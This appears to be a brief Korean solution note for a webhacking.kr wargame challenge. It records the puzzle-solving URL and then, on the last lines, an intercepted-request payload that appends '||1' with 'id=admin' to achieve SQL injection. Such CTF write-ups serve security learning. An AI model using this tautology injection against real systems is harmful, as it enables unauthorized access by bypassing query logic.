#http://webhacking.kr/challenge/web/web-03/
'''
---설명---
퍼즐을 만나게 되면 간단한 게임(아래 - 표시된 부분을 클릭하고 gogo버튼 클릭)
     1
   1 1 1
   13131
111- - -
  0
  3 ---
 11 - -
  5-----
'''

#http://webhacking.kr/challenge/web/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111

# 이제는 burp suite 드의 프록시 도구를 통해 진행하여 전송하는 데이터를 수정하고 재전송 필요

# answer=1010100000011100101011111||1&id=admin
# || 1 값을 추가하여 SQL INJECTION 성공
# sovle : new_sql_injection


